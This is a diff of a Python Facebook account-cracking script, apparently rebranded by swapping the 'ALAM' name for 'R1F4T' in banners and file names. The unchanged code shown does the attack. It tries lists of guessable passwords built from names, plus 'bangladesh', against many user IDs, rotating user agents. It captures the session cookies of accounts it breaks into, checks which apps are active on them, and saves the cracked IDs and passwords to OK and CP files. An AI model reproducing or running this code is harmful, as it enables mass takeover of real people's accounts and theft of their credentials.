@@ -148,7 +148,7 @@ else:
     
     os.system('xdg-open https://www.facebook.com/Normal.User.Alamgir')
     exit()
-def ALAMx():
+def R1F4Tx():
 	print(54*'━')
 def cek_apk(session,coki):
 	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
@@ -217,8 +217,8 @@ def fuck():
             pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
             yaari.submit(naim2,uid,pwx,tl)
     print(54*'━')
-    print(' [+] OK Ids saved in ALAM/OK.txt')
-    print(' [+] CP Ids saved in ALAM/CP.txt')
+    print(' [+] OK Ids saved in R1F4T/OK.txt')
+    print(' [+] CP Ids saved in R1F4T/CP.txt')
     print(54*'━')
     
 agents=[]
@@ -236,7 +236,7 @@ def naim2(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write('\r [ALAM]-[%s|%s]\33[1;92m[OK:%s]\r'%(loop,tl,len(oks))),
+            sys.stdout.write('\r [R1F4T]-[%s|%s]\33[1;92m[OK:%s]\r'%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             m_fb = session.get('https://free.facebook.com/?tbua=1').text
@@ -275,16 +275,16 @@ def naim2(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;97m [\33[1;92mALAM-OK\33[1;97m] \33[1;92m'+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;97m [\33[1;92mR1F4T-OK\33[1;97m] \33[1;92m'+cid+' | '+ps+'\33[0;92m')
                # print (f"\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;32m COOKIES: {coki} ")
-                open('ALAM-OK.txt', 'a').write(cid+' | '+ps+'\n')
+                open('R1F4T-OK.txt', 'a').write(cid+' | '+ps+'\n')
                 oks.append(uid);cek_apk(coki)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:156]
                 print('\33[1;91m[CHECKPOINT] '+uid+' | '+ps+'\33[0;97m')
-                open('ALAM-CP.txt', 'a').write(cid+' | '+ps+'\n')
+                open('R1F4T-CP.txt', 'a').write(cid+' | '+ps+'\n')
                 cps.append(cid)
                 break
             else:
